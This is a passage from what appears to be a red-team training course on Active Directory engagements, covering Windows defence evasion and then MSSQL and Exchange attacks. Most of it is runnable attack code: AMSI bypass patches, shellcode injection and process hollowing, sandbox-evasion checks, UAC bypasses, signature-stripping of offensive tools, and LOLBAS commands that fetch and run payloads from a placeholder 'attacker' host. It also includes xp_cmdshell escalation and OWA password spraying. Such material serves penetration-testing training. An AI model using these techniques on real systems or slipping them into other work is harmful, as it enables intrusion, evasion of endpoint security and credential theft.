13. Windows Evasion Techniques

Modern Windows environments deploy multiple layers of security controls. This module covers techniques for evading antivirus, application whitelisting, and other endpoint protections during Active Directory engagements.

13.1 Defender and Detection Mechanisms

Microsoft Defender is the built-in antivirus solution on Windows 10 and later. It combines signature-based detection, behavioral monitoring, and cloud-delivered protection to identify malicious activity.

13.1.1 How Defender Works

Defender uses three primary detection mechanisms:

  • Signature-based: matches files against a database of known malware hashes and byte patterns
  • Heuristic/behavioral: monitors runtime behavior for suspicious API call patterns, memory allocations, and process relationships
  • Cloud-based: submits unknown samples to Microsoft's cloud for detonation and classification

13.1.2 Real-time Protection

Real-time protection (RTP) scans files on access, download, and execution. It hooks file system operations and inspects content before allowing processes to execute. RTP also integrates with AMSI for script-based content scanning.

13.1.3 Cloud Protection

Cloud-delivered protection sends metadata and samples of suspicious files to Microsoft's cloud for analysis. When enabled, unknown files may be blocked for up to 10 seconds while the cloud analysis completes (block at first sight).

13.1.4 Tamper Protection

Tamper Protection prevents unauthorized changes to Defender settings. When enabled, it blocks attempts to disable real-time protection, cloud protection, and behavior monitoring, even by administrators. It can only be managed through Microsoft Endpoint Manager or the Windows Security portal.

13.1.5 Querying Defender Status

# Check Defender status
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, BehaviorMonitorEnabled

# Check for exclusions
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension

# Check signature update status
Get-MpComputerStatus | Select-Object AntivirusSignatureLastUpdated, AntispywareSignatureLastUpdated

# Disable Defender (requires admin, blocked by Tamper Protection)
Set-MpPreference -DisableRealtimeMonitoring $true

13.2 Static and Dynamic Evasion

Static analysis examines a file without executing it. Evasion focuses on modifying the binary to avoid known signatures while preserving functionality.

13.2.1 Static Analysis Evasion

Static analysis examines a file without executing it. Evasion focuses on modifying the binary to avoid known signatures while preserving functionality.

Signature-based Detection

Antivirus engines maintain signature databases of known malware patterns. These include byte sequences, file hashes, import table patterns, and string matches. Bypassing signatures requires modifying the binary enough that no known pattern matches.

String Obfuscation
// XOR-encode strings at compile time
public static string Deobfuscate(byte[] data, byte key) {
    byte[] result = new byte[data.Length];
    for (int i = 0; i < data.Length; i++)
        result[i] = (byte)(data[i] ^ key);
    return Encoding.UTF8.GetString(result);
}

// Instead of: string target = "AmsiScanBuffer";
// Use: string target = Deobfuscate(new byte[] { 0x20, 0x2C, ... }, 0x41);
Payload Encryption
// AES-decrypt shellcode at runtime
byte[] encrypted = File.ReadAllBytes("payload.enc");
using (Aes aes = Aes.Create()) {
    aes.Key = Convert.FromBase64String(key);
    aes.IV = Convert.FromBase64String(iv);
    using (var decryptor = aes.CreateDecryptor())
        shellcode = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
}
Packing

Packers compress and encrypt the original binary, adding a small loader stub that unpacks the payload at runtime. Common packers include UPX (easily detected), Themida, VMProtect, and custom packers. Custom packers are more effective because commercial ones have known signatures.

Timestomping
# Modify file timestamps to blend with legitimate files
$file = Get-Item C:\Windows\Temp\implant.exe
$file.CreationTime = "01/01/2023 08:00:00"
$file.LastWriteTime = "01/01/2023 08:00:00"
$file.LastAccessTime = "01/01/2023 08:00:00"

13.2.2 Dynamic Analysis Evasion

Dynamic analysis executes the payload in a monitored environment (sandbox) to observe its behavior. Evasion techniques detect or delay analysis to avoid triggering behavioral detections.

Sandbox Detection
// Check for sandbox indicators
bool IsSandbox() {
    // Low memory (sandboxes often have limited RAM)
    if (new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory < 2147483648)
        return true;
    // Few processors
    if (Environment.ProcessorCount < 2)
        return true;
    // Recent uptime (sandboxes restart frequently)
    if (Environment.TickCount < 1200000)
        return true;
    // Known sandbox usernames
    string user = Environment.UserName.ToLower();
    string[] sandbox_users = { "sandbox", "malware", "virus", "sample" };
    return sandbox_users.Any(s => user.Contains(s));
}
Behavioral Analysis

Behavioral analysis monitors API calls, registry modifications, file operations, and network connections. Evasion strategies include indirect API resolution (dynamic loading via GetProcAddress), API call splitting across multiple functions, and executing benign operations before malicious activity to dilute behavioral signatures.

Sleep Timers and Delay
// Delay execution to outlast sandbox analysis windows
// Most sandboxes analyze for 60-120 seconds
DateTime start = DateTime.Now;
Thread.Sleep(120000); // 2-minute sleep
// Verify time actually passed (sandboxes may fast-forward sleep)
if ((DateTime.Now - start).TotalSeconds < 110)
    Environment.Exit(0); // Sleep was skipped, likely a sandbox
API Unhooking
// Unhook ntdll.dll by loading a fresh copy from disk
// EDR products hook ntdll functions to monitor API calls
IntPtr ntdll = GetModuleHandle("ntdll.dll");
byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// Parse PE headers, find .text section, overwrite hooked bytes
// with the clean copy from disk

13.2.3 Process Injection

Process injection executes code in the address space of another process, inheriting its security context and blending with legitimate activity.

Classic Injection
// Allocate memory, write shellcode, create thread in current process
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
Marshal.Copy(shellcode, 0, addr, shellcode.Length);
IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);
Remote Thread Injection
// Inject into a remote process
IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr remoteAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, remoteAddr, shellcode, shellcode.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);
Process Hollowing

Process hollowing creates a legitimate process in a suspended state, unmaps its original code, writes malicious code in its place, then resumes execution. The malicious code runs under the identity of the legitimate process.

// 1. Create target process suspended
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ..., ref si, out pi);

// 2. Unmap the original image
NtUnmapViewOfSection(pi.hProcess, imageBase);

// 3. Allocate new memory and write payload
VirtualAllocEx(pi.hProcess, imageBase, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, imageBase, payload, payloadSize, out _);

// 4. Update the entry point in the thread context and resume
// SetThreadContext(...) + ResumeThread(pi.hThread)
APC Injection

Asynchronous Procedure Calls (APCs) queue code to execute when a thread enters an alertable state. This avoids creating a new thread, which is a common detection point.

// Queue an APC to an alertable thread
IntPtr hThread = OpenThread(0x0010, false, threadId); // THREAD_SET_CONTEXT
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out _);
QueueUserAPC(addr, hThread, IntPtr.Zero);
Early Bird Injection

Early Bird combines process creation in a suspended state with APC injection. The APC fires before the process entry point executes, running the payload before any EDR hooks are initialized in the new process.

Methodology

  • Obfuscate strings in payload source to avoid signature matches: 
    // XOR-encode strings at compile time
public static string Deobfuscate(byte[] data, byte key) {
    byte[] result = new byte[data.Length];
    for (int i = 0; i < data.Length; i++)
        result[i] = (byte)(data[i] ^ key);
    return Encoding.UTF8.GetString(result);
}
  • Encrypt shellcode with AES and decrypt at runtime: 
    byte[] encrypted = File.ReadAllBytes("payload.enc");
using (Aes aes = Aes.Create()) {
    aes.Key = Convert.FromBase64String(key);
    aes.IV = Convert.FromBase64String(iv);
    using (var decryptor = aes.CreateDecryptor())
        shellcode = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
}
  • Timestomp the payload to blend with legitimate system files: 
    $file = Get-Item C:\Windows\Temp\implant.exe
$file.CreationTime = "01/01/2023 08:00:00"
$file.LastWriteTime = "01/01/2023 08:00:00"
$file.LastAccessTime = "01/01/2023 08:00:00"
  • Add sandbox detection checks before executing payload: 
    // Abort if running in sandbox
if (Environment.ProcessorCount < 2) return;
if (Environment.TickCount < 1200000) return;
  • Add a sleep timer with verification to outlast sandbox analysis: 
    DateTime start = DateTime.Now;
Thread.Sleep(120000);
if ((DateTime.Now - start).TotalSeconds < 110)
    Environment.Exit(0); // Sleep was skipped, likely sandbox
  • Unhook ntdll.dll by overwriting with a clean copy from disk: 
    IntPtr ntdll = GetModuleHandle("ntdll.dll");
byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// Parse PE headers, find .text section, overwrite hooked bytes
  • Choose an injection technique and inject shellcode into a target process: 
    // Remote thread injection
IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr remoteAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, remoteAddr, shellcode, shellcode.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);

13.3 AMSI and Open-Source Evasion

AMSI is a Windows interface that allows applications to submit content to the registered antimalware provider for scanning. It intercepts PowerShell scripts, VBA macros, JavaScript, and .NET assembly loads before execution.

13.3.1 Antimalware Scan Interface (AMSI)

AMSI is a Windows interface that allows applications to submit content to the registered antimalware provider for scanning. It intercepts PowerShell scripts, VBA macros, JavaScript, and .NET assembly loads before execution.

How AMSI Works

When a script host (PowerShell, cscript, etc.) executes content, it calls AmsiScanBuffer or AmsiScanString in amsi.dll. The scan result determines whether execution proceeds or is blocked. The scan chain:

  1. Script host loads amsi.dll and calls AmsiInitialize
  2. Before executing each script block, the host calls AmsiScanBuffer
  3. AMSI forwards the content to the registered antimalware provider (typically Defender)
  4. The provider returns a verdict: clean, suspicious, or malicious
  5. The script host blocks execution if the verdict is malicious
AMSI Bypass Techniques
# Memory patching: overwrite AmsiScanBuffer to return AMSI_RESULT_CLEAN
# This patches the first bytes of AmsiScanBuffer with a return instruction
$a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*iUtils" }
$b = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
[IntPtr]$ptr = $b.GetValue($null)
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
// C# AMSI bypass via patching
var lib = LoadLibrary("amsi.dll");
var addr = GetProcAddress(lib, "AmsiScanBuffer");
VirtualProtect(addr, (UIntPtr)5, 0x40, out uint oldProtect);
// Patch with: mov eax, 0x80070057 (E_INVALIDARG); ret
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
Marshal.Copy(patch, 0, addr, patch.Length);
VirtualProtect(addr, (UIntPtr)5, oldProtect, out _);
AMSI in .NET

.NET Framework 4.8 and later integrates AMSI scanning for dynamically loaded assemblies. When Assembly.Load is called, the CLR submits the assembly bytes to AMSI before loading. This affects execute-assembly style attacks. Bypasses include patching amsi.dll before loading the target assembly, or using obfuscated loaders that avoid triggering the AMSI scan path.

13.3.2 Open-Source Software Evasion

Public offensive tools (Rubeus, SharpHound, Mimikatz) have well-known signatures. Using them without modification guarantees detection. Evasion requires modifying the source before compilation.

  • String replacement: rename class names, method names, and embedded strings that serve as signatures
  • Namespace changes: change default namespaces like Rubeus or SharpHound
  • Remove help text and banners: ASCII art, version strings, and usage text are signature targets
  • Change GUIDs and assembly metadata: modify AssemblyInfo.cs values
  • Obfuscation tools: ConfuserEx, InvisibilityCloak for .NET; Veil, Scarecrow for payload generation
  • Recompile from source: building from source with modifications produces a unique binary hash
# Example: modify and recompile Rubeus
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus

# Replace identifiable strings
find . -name "*.cs" -exec sed -i 's/Rubeus/CustomTool/g' {} \;
find . -name "*.cs" -exec sed -i 's/GhostPack/Internal/g' {} \;

# Change the assembly name
sed -i 's/Rubeus/CustomTool/' Rubeus/Rubeus.csproj

# Build
dotnet build -c Release

Methodology

  • Bypass AMSI via PowerShell memory patching: 
    $a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*iUtils" }
$b = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
[IntPtr]$ptr = $b.GetValue($null)
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
  • Bypass AMSI via C# patching of AmsiScanBuffer: 
    var lib = LoadLibrary("amsi.dll");
var addr = GetProcAddress(lib, "AmsiScanBuffer");
VirtualProtect(addr, (UIntPtr)5, 0x40, out uint oldProtect);
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
Marshal.Copy(patch, 0, addr, patch.Length);
VirtualProtect(addr, (UIntPtr)5, oldProtect, out _);
  • Patch AMSI before loading .NET assemblies (required for execute-assembly attacks): 
    // Patch amsi.dll in current process BEFORE calling Assembly.Load()
// .NET 4.8+ submits assembly bytes to AMSI on dynamic load
  • Modify open-source tool source to remove signatures before compiling: 
    git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
find . -name "*.cs" -exec sed -i 's/Rubeus/CustomTool/g' {} \;
find . -name "*.cs" -exec sed -i 's/GhostPack/Internal/g' {} \;
sed -i 's/Rubeus/CustomTool/' Rubeus/Rubeus.csproj
  • Change GUIDs, assembly metadata, and remove banners, then rebuild: 
    dotnet build -c Release
  • Apply additional obfuscation with ConfuserEx or InvisibilityCloak for .NET assemblies

13.4 Application Control and UAC Bypasses

UAC prompts users for consent before allowing high-integrity operations. UAC bypasses elevate from medium to high integrity without triggering the consent dialog.

13.4.1 User Account Control (UAC) Bypass

UAC prompts users for consent before allowing high-integrity operations. UAC bypasses elevate from medium to high integrity without triggering the consent dialog.

UAC Overview

UAC splits administrator tokens into a filtered (medium integrity) and elevated (high integrity) token. Most applications run with the filtered token. UAC settings are controlled by registry keys under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System:

  • EnableLUA: enables/disables UAC entirely
  • ConsentPromptBehaviorAdmin: controls prompt behavior (0=no prompt, 1=credentials, 2=consent, 5=default)
  • PromptOnSecureDesktop: renders the prompt on the secure desktop
Fodhelper
# Fodhelper.exe auto-elevates and reads a command from the registry
# Set the command to execute
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "C:\Windows\Temp\implant.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force

# Trigger fodhelper
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
CMSTPLUA

The CMSTPLUA COM object auto-elevates and can execute arbitrary commands. This bypass creates an instance of the COM object and calls its ShellExec method.

// CMSTPLUA UAC bypass via COM elevation
Type comType = Type.GetTypeFromCLSID(new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7"));
dynamic obj = Activator.CreateInstance(comType);
obj.ShellExec("C:\\Windows\\Temp\\implant.exe");
Environment Variable Abuse

Some auto-elevating binaries use environment variables to resolve paths. By modifying %windir% or %systemroot% for the current user, the binary loads a DLL from an attacker-controlled path instead of the system directory.

13.4.2 AppLocker Bypass

AppLocker restricts which executables, scripts, DLLs, and installers users can run based on publisher, path, or hash rules.

AppLocker Overview
# Query AppLocker policy
Get-AppLockerPolicy -Effective -Xml | Out-File applocker-policy.xml

# Check specific file against policy
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Temp\tool.exe -User Everyone
Trusted Paths

Default AppLocker rules allow execution from C:\Windows\* and C:\Program Files\*. Writable subdirectories within these paths bypass the policy:

# Find writable directories under trusted paths
accesschk.exe -uwdqs "Users" C:\Windows\ 2>nul
# Common writable locations:
# C:\Windows\Tasks
# C:\Windows\Temp
# C:\Windows\Tracing
# C:\Windows\System32\spool\drivers\color
LOLBAS

Living Off the Land Binaries and Scripts are Microsoft-signed executables that can proxy code execution:

# Execute arbitrary code via msbuild
msbuild.exe C:\Windows\Temp\payload.csproj

# Execute via CMSTP
cmstp.exe /ni /s C:\Windows\Temp\payload.inf
DLL Bypass

If DLL rules are not enforced (they are off by default), load a malicious DLL via rundll32 or DLL search order hijacking. Even with DLL rules, signed binaries that load arbitrary DLLs from user-writable paths can be exploited.

PowerShell CLM Bypass
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Bypass via custom PowerShell runspace (requires a .NET loader)
# Or use InstallUtil with a .NET assembly containing PowerShell code
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\bypass.exe

Methodology

  • Check current integrity level and UAC configuration: 
    whoami /groups | findstr Level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
  • Bypass UAC via fodhelper auto-elevation: 
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "C:\Windows\Temp\implant.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
  • Alternative UAC bypass via CMSTPLUA COM object: 
    Type comType = Type.GetTypeFromCLSID(new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7"));
dynamic obj = Activator.CreateInstance(comType);
obj.ShellExec("C:\\Windows\\Temp\\implant.exe");
  • Enumerate AppLocker policy and test execution rules: 
    Get-AppLockerPolicy -Effective -Xml | Out-File applocker-policy.xml
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Temp\tool.exe -User Everyone
  • Find writable directories within AppLocker trusted paths: 
    accesschk.exe -uwdqs "Users" C:\Windows\ 2>nul
# Common writable: C:\Windows\Tasks, C:\Windows\Temp, C:\Windows\Tracing
  • Use LOLBAS to proxy execution past AppLocker: 
    msbuild.exe C:\Windows\Temp\payload.csproj
cmstp.exe /ni /s C:\Windows\Temp\payload.inf
  • Bypass PowerShell CLM via InstallUtil or a custom .NET runspace: 
    # Check language mode
$ExecutionContext.SessionState.LanguageMode
# Bypass via InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\bypass.exe

13.5 Living off the Land and CLM

LOLBAS are legitimate, signed Windows binaries that can be repurposed for offensive operations. They bypass application whitelisting and avoid dropping custom tools to disk.

13.5.1 LOLBAS: Living off the Land

LOLBAS are legitimate, signed Windows binaries that can be repurposed for offensive operations. They bypass application whitelisting and avoid dropping custom tools to disk.

BinaryCapabilityExample
mshta.exeExecute HTA/VBScriptmshta http://attacker/payload.hta
rundll32.exeLoad and execute DLLrundll32 payload.dll,EntryPoint
regsvr32.exeExecute SCT scriptsregsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll
certutil.exeDownload files, decode Base64certutil -urlcache -split -f http://attacker/payload.exe
bitsadmin.exeDownload filesbitsadmin /transfer job http://attacker/payload.exe C:\Temp\payload.exe
msbuild.exeCompile and execute C# inlinemsbuild payload.csproj
wmic.exeExecute XSL scriptswmic os get /format:"http://attacker/payload.xsl"
cmstp.exeExecute INF/SCT filescmstp /ni /s payload.inf

13.5.2 PowerShell Constrained Language Mode (CLM)

CLM restricts PowerShell to a subset of functionality, blocking .NET types, COM objects, and Win32 API access. It is typically enforced by AppLocker or WDAC policies.

# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage = restricted
# FullLanguage = unrestricted

# In CLM, these are blocked:
# [System.Runtime.InteropServices.Marshal] - blocked
# Add-Type - blocked
# New-Object System.Net.WebClient - blocked
# Invoke-Expression with certain constructs - blocked

Bypasses:

  • PowerShell v2: powershell -version 2 uses the old engine without AMSI or CLM (requires .NET Framework 2.0/3.5 installed)
  • Custom runspace: create a C# application that hosts a PowerShell runspace in Full Language Mode
  • MSBuild: embed PowerShell commands in a .csproj file executed via msbuild.exe
  • InstallUtil: wrap PowerShell in a .NET assembly and execute via InstallUtil.exe

Methodology

  • Download files using signed Windows binaries to avoid detection: 
    certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\payload.exe
bitsadmin /transfer job http://attacker/payload.exe C:\Temp\payload.exe
  • Execute payloads via LOLBAS to bypass application whitelisting: 
    mshta http://attacker/payload.hta
rundll32 payload.dll,EntryPoint
regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll
msbuild payload.csproj
  • Execute XSL scripts via wmic for fileless code execution: 
    wmic os get /format:"http://attacker/payload.xsl"
  • Check PowerShell language mode and identify CLM restrictions: 
    $ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage = restricted
# FullLanguage = unrestricted
  • Bypass CLM using PowerShell v2 (if .NET 2.0/3.5 is installed): 
    powershell -version 2
  • Bypass CLM via MSBuild or InstallUtil to run .NET code outside CLM: 
    msbuild.exe C:\Windows\Temp\payload.csproj
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\bypass.exe

14. MSSQL, Exchange, and SCCM Attacks

Enterprise infrastructure services often have privileged access to Active Directory and hold credentials that can be leveraged for lateral movement and domain compromise.

14.1 MSSQL Server Attacks

Microsoft SQL Server integrates tightly with Active Directory. SQL instances run under service accounts (often domain accounts) and support Windows Authentication via Kerberos. Key concepts:

14.1.1 Introduction to MSSQL Server

Microsoft SQL Server integrates tightly with Active Directory. SQL instances run under service accounts (often domain accounts) and support Windows Authentication via Kerberos. Key concepts:

  • Windows Authentication: uses the caller's Kerberos/NTLM identity; no separate SQL credentials
  • Mixed Mode: supports both Windows and SQL authentication (sa account)
  • Server roles: sysadmin (full control), securityadmin, serveradmin, dbcreator, etc.
  • Database roles: db_owner, db_datareader, db_datawriter per database
# Discover MSSQL instances on the network
proxychains -q impacket-mssqlclient -windows-auth CORP/user:password@10.10.10.20
# Or scan for port 1433
proxychains -q nmap -sT -Pn -p 1433 10.10.10.0/24

14.1.2 MSSQL Privilege Escalation

Escalating from a low-privilege SQL login to sysadmin opens the door to command execution and credential extraction.

Impersonation
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate a higher-privilege login
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- should show 'sa'

-- Check sysadmin membership
SELECT IS_SRVROLEMEMBER('sysadmin');
Linked Servers
-- Enumerate linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Check your identity on the linked server
SELECT * FROM OPENQUERY(LinkedSrv, 'SELECT SYSTEM_USER');

-- Check sysadmin on linked server
SELECT * FROM OPENQUERY(LinkedSrv, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
xp_cmdshell
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';

14.1.3 MSSQL Command Execution

Multiple methods exist for executing operating system commands from a SQL Server context.

-- Method 1: xp_cmdshell
EXEC xp_cmdshell 'whoami';

-- Method 2: OLE Automation Procedures
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
DECLARE @output INT;
EXEC sp_OACreate 'wscript.shell', @output OUTPUT;
EXEC sp_OAMethod @output, 'run', null, 'cmd /c whoami > C:\temp\output.txt';

-- Method 3: CLR Assembly (custom .NET code)
-- Create an assembly with OS command execution capabilities
-- Requires TRUSTWORTHY or signed assembly
# From Linux with mssqlclient.py
proxychains -q impacket-mssqlclient CORP/sqlsvc:'P@ssw0rd'@10.10.10.20 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

14.1.4 MSSQL Lateral Movement

Linked servers create trust chains between SQL instances that can be crawled for lateral movement.

-- Crawl linked servers (nested links)
SELECT * FROM OPENQUERY(LinkedSrv1, 'SELECT * FROM OPENQUERY(LinkedSrv2, ''SELECT SYSTEM_USER'')');

-- Execute commands on a linked server
EXEC ('xp_cmdshell ''whoami''') AT LinkedSrv1;

-- Enable xp_cmdshell on a linked server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT LinkedSrv1;
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT LinkedSrv1;
# Automated linked server crawling with PowerUpSQL
execute-assembly /opt/tools/PowerUpSQL.dll ; Get-SQLServerLinkCrawl -Instance SQL01 -Query "exec master..xp_cmdshell 'whoami'"

14.1.5 MSSQL Tools of the Trade

ToolPlatformDescription
mssqlclient.pyLinuxImpacket's interactive SQL client with Windows auth support
PowerUpSQLWindowsPowerShell toolkit for SQL Server discovery, audit, and exploitation
SQLReconWindows.NET tool for SQL Server reconnaissance and post-exploitation
HeidiSQLWindowsGUI client for MSSQL, MySQL, PostgreSQL
SSMSWindowsOfficial Microsoft SQL Server Management Studio
 
# PowerUpSQL: discover and audit SQL instances
execute-assembly /opt/tools/PowerUpSQL.dll ; Get-SQLInstanceDomain
execute-assembly /opt/tools/PowerUpSQL.dll ; Get-SQLServerInfo -Instance SQL01
execute-assembly /opt/tools/PowerUpSQL.dll ; Invoke-SQLAudit -Instance SQL01

14.1.6 MSSQL Defensive Considerations

  • Principle of least privilege: avoid granting sysadmin; use granular database roles
  • Disable xp_cmdshell: disable and monitor for re-enablement via sp_configure changes
  • Remove unnecessary linked servers: each link expands the attack surface
  • Use Group Managed Service Accounts (gMSA): auto-rotated credentials for SQL service accounts
  • Enable SQL Server Audit: log login attempts, privilege changes, and command execution
  • Restrict OLE Automation and CLR: disable unless explicitly required
  • Network segmentation: restrict SQL Server access to application servers only

Methodology

  • Discover MSSQL instances on the network: 
    proxychains -q nmap -sT -Pn -p 1433 10.10.10.0/24
  • Connect to MSSQL with domain credentials: 
    proxychains -q impacket-mssqlclient -windows-auth CORP/user:password@10.10.10.20
  • Check impersonation privileges and escalate to sysadmin: 
    SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
  • Enumerate linked servers and check identity on each: 
    EXEC sp_linkedservers;
SELECT * FROM OPENQUERY(LinkedSrv, 'SELECT SYSTEM_USER');
SELECT * FROM OPENQUERY(LinkedSrv, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
  • Enable xp_cmdshell and execute OS commands: 
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
  • Crawl linked server chains for lateral movement: 
    SELECT * FROM OPENQUERY(LinkedSrv1, 'SELECT * FROM OPENQUERY(LinkedSrv2, ''SELECT SYSTEM_USER'')');
EXEC ('xp_cmdshell ''whoami''') AT LinkedSrv1;
  • Use PowerUpSQL for automated discovery and auditing: 
    execute-assembly /opt/tools/PowerUpSQL.dll ; Get-SQLInstanceDomain
execute-assembly /opt/tools/PowerUpSQL.dll ; Get-SQLServerLinkCrawl -Instance SQL01 -Query "exec master..xp_cmdshell 'whoami'"

14.2 Exchange Server Attacks

Microsoft Exchange Server manages email, calendaring, and collaboration within organizations. Exchange integrates deeply with Active Directory, storing mailbox data and configuration in AD objects. Key components:

14.2.1 Introduction to Exchange

Microsoft Exchange Server manages email, calendaring, and collaboration within organizations. Exchange integrates deeply with Active Directory, storing mailbox data and configuration in AD objects. Key components:

  • Outlook Web Access (OWA): browser-based email access
  • Exchange Web Services (EWS): SOAP-based API for programmatic access
  • AutoDiscover: automatic client configuration endpoint
  • Exchange Admin Center (EAC): web-based administration console
  • Exchange Management Shell (EMS): PowerShell-based administration

14.2.2 Exchange Enumeration

# Discover Exchange servers via DNS
dig MX corp.local
nslookup -type=srv _autodiscover._tcp.corp.local

# Identify Exchange version from OWA headers
curl -sk https://mail.corp.local/owa/ -I | grep X-OWA-Version

# Enumerate users via timing attack on /autodiscover
# or via OWA login form response differences
# MailSniper: enumerate users, search mailboxes
# Password spray against OWA
Invoke-PasswordSprayOWA -ExchHostname mail.corp.local -UserList users.txt -Password 'Spring2024!'

# Search mailboxes for sensitive content (requires valid credentials)
Invoke-SelfSearch -Mailbox user@corp.local -ExchHostname mail.corp.local -Terms "password","credentials","vpn"

# Enumerate the Global Address List
Get-GlobalAddressList -ExchHostname mail.corp.local -UserName CORP\user -Password 'P@ssw0rd'

14.2.3 Exchange Vulnerabilities

VulnerabilityCVEImpact
ProxyLogonCVE-2021-26855 + CVE-2021-27065SSRF to RCE; unauthenticated remote code execution
ProxyShellCVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207Pre-auth RCE via AutoDiscover, elevation, and arbitrary file write
ProxyNotShellCVE-2022-41040 + CVE-2022-41082Authenticated SSRF to RCE; requires valid credentials
PrivExchangeCVE-2019-0686NTLM relay from Exchange to DC; escalate to Domain Admin
